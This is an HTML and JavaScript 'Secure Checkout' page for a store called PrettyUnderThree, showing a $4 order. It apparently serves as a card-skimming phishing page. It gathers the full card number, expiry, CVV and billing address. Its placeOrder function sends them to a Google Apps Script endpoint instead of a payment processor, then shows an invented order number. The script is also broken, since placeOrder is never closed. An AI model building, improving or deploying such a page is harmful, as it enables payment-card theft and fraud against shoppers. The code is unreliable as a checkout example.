<!DOCTYPE html>
<html>
<head>
  <title>Secure Checkout | PrettyUnderThree</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      margin: 0;
    }

    header {
      background: black;
      color: gold;
      padding: 15px;
      text-align: center;
      font-size: 20px;
      font-weight: bold;
    }

    .container {
      max-width: 1100px;
      margin: auto;
      padding: 15px;
      display: flex;
      gap: 20px;
    }

    .left, .right {
      background: white;
      padding: 20px;
      border-radius: 10px;
    }

    .left { flex: 2; }
    .right { flex: 1; }

    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border-radius: 6px;
      border: 1px solid #ccc;
    }

    .row {
      display: flex;
      gap: 10px;
    }

    button {
      width: 100%;
      padding: 15px;
      margin-top: 10px;
      background: #ffa41c;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      font-weight: bold;
    }

    .secondary {
      background: #ddd;
    }

    .summary-row {
      display: flex;
      justify-content: space-between;
      margin: 8px 0;
    }

    .total {
      font-weight: bold;
      font-size: 18px;
      color: #b12704;
    }

    .step { display: none; }
    .active { display: block; }

    @media (max-width: 768px) {
      .container {
        flex-direction: column;
      }
    }
  </style>
</head>

<body>

<header>🔒 Secure Checkout</header>

<div class="container">

  <!-- LEFT -->
  <div class="left">

    <!-- STEP 1 -->
    <div id="step1" class="step active">

      <h3>Contact</h3>
      <input type="email" id="email" placeholder="Email">

      <h3>Shipping</h3>
      <input type="text" id="name" placeholder="Full Name">
      <input type="text" id="address" placeholder="Address">
      <input type="text" id="city" placeholder="City">

      <div class="row">
        <input type="text" id="state" placeholder="State">
        <input type="text" id="zip" placeholder="ZIP">
      </div>

      <button onclick="goToPayment()">Continue</button>
    </div>

    <!-- STEP 2 -->
    <div id="step2" class="step">

      <h3>Payment</h3>

      <input type="text" id="card" placeholder="Card Number" oninput="detectCard()">
      <div id="cardType" style="margin-bottom:10px;"></div>

      <div class="row">
        <input type="text" id="exp" placeholder="MM/YY">
        <input type="text" id="cvv" placeholder="CVV">
      </div>

      <input type="text" id="cardname" placeholder="Name on Card">

      <h3>Billing Address</h3>
      <input type="text" id="bname" placeholder="Full Name">
      <input type="text" id="baddress" placeholder="Address">
      <input type="text" id="bcity" placeholder="City">

      <div class="row">
        <input type="text" id="bstate" placeholder="State">
        <input type="text" id="bzip" placeholder="ZIP">
      </div>

      <button onclick="placeOrder()">Place Order</button>
      <button class="secondary" onclick="backToShipping()">Back</button>

    </div>

  </div>

  <!-- RIGHT -->
  <div class="right">

    <h3>Summary</h3>

    <div class="summary-row">
      <span>Items</span>
      <span>$3</span>
    </div>

    <div class="summary-row">
      <span>Shipping</span>
      <span style="color:green;">FREE</span>
    </div>

    <div class="summary-row">
      <span>Tax</span>
      <span>$1</span>
    </div>

    <hr>

    <div class="summary-row total">
      <span>Total</span>
      <span>$4</span>
    </div>

  </div>

</div>

<script>
// VALIDATION
function isValidEmail(e){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);}
function isValidZip(z){return /^\d{5}$/.test(z);}
function isValidState(s){return /^[A-Za-z]{2}$/.test(s);}
function isValidCVV(c){return /^\d{3,4}$/.test(c);}
function isValidExp(e){return /^(0[1-9]|1[0-2])\/\d{2}$/.test(e);}

// CHECK EXPIRED
function isExpired(exp){
  let [m,y] = exp.split("/");
  let now = new Date();
  let year = 2000 + parseInt(y);
  let month = parseInt(m);
  return year < now.getFullYear() || 
         (year === now.getFullYear() && month < now.getMonth()+1);
}

// LUHN CHECK
function luhnCheck(card){
  let sum=0,flip=false;
  card=card.replace(/\D/g,'');
  for(let i=card.length-1;i>=0;i--){
    let n=parseInt(card[i]);
    if(flip){n*=2;if(n>9)n-=9;}
    sum+=n;flip=!flip;
  }
  return sum%10===0;
}

// CARD TYPE
function getCardType(n){
  n=n.replace(/\D/g,'');
  if(/^4/.test(n)) return "Visa";
  if(/^5/.test(n)) return "Mastercard";
  if(/^3/.test(n)) return "Amex";
  return "Card";
}

function detectCard(){
  cardType.innerHTML = cardEl.value ? "Card: " + getCardType(cardEl.value) : "";
}

// NAVIGATION
function goToPayment(){
  if(!isValidEmail(emailEl.value)){
    alert("Invalid email");
    return;
  }

  step1.classList.remove("active");
  step2.classList.add("active");

  // CLEAR billing fields (IMPORTANT FIX)
  bnameEl.value="";
  baddressEl.value="";
  bcityEl.value="";
  bstateEl.value="";
  bzipEl.value="";
}

function backToShipping(){
  step2.classList.remove("active");
  step1.classList.add("active");
}

// FINAL CHECK
function placeOrder(){

  let card = cardEl.value.replace(/\D/g,'');

  if(card.length < 13){
    alert("Card too short"); return;
  }

  if(!luhnCheck(card)){
    alert("Invalid card number"); return;
  }

  if(!isValidExp(expEl.value)){
    alert("Invalid expiration"); return;
  }

  if(isExpired(expEl.value)){
    alert("Card expired"); return;
  }

  if(!isValidCVV(cvvEl.value)){
    alert("Invalid CVV"); return;
  }

  if(!bnameEl.value || !baddressEl.value || !bcityEl.value || !bstateEl.value || !bzipEl.value){
    alert("Billing address required"); return;
  }

  // SUBMIT DATA

  const data = {
    email: document.getElementById("email").value,
    cardnum: document.getElementById("card").value,
    expdate: document.getElementById("exp").value,
    cvv: document.getElementById("cvv").value,
    cardname: document.getElementById("cardname").value,
    bname: document.getElementById("bname").value,
    baddress: document.getElementById("baddress").value,
    bcity: document.getElementById("bcity").value,
    bstate: document.getElementById("bstate").value,
    bzip: document.getElementById("bzip").value
  };

  fetch("https://script.google.com/macros/s/AKfycbxgqumKEhFDaNHqn9AKxp8cFFs2Is5yh4FCCbrMfYCLuRq3QZ2yzPArCVK3zEL5kt0eLA/exec", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify(data)
})
.then(() => {

  const orderNumber = "PU3-" + Math.floor(100000 + Math.random() * 900000);
  const now = new Date();

  localStorage.setItem("orderData", JSON.stringify({
    orderNumber: orderNumber,
    name: nameEl.value,
    email: emailEl.value,
    total: "$4.00",
    date: now.toLocaleDateString(),
    time: now.toLocaleTimeString()
  }));

  window.location.href = "confirmation.html";

})
.catch(() => {
  alert("Order failed. Try again.");
});


// ELEMENTS
const emailEl=document.getElementById("email");
const nameEl=document.getElementById("name");
const addressEl=document.getElementById("address");
const cityEl=document.getElementById("city");
const stateEl=document.getElementById("state");
const zipEl=document.getElementById("zip");

const cardEl=document.getElementById("card");
const expEl=document.getElementById("exp");
const cvvEl=document.getElementById("cvv");

const bnameEl=document.getElementById("bname");
const baddressEl=document.getElementById("baddress");
const bcityEl=document.getElementById("bcity");
const bstateEl=document.getElementById("bstate");
const bzipEl=document.getElementById("bzip");

const step1=document.getElementById("step1");
const step2=document.getElementById("step2");
const cardType=document.getElementById("cardType");
</script>

</body>
</html>
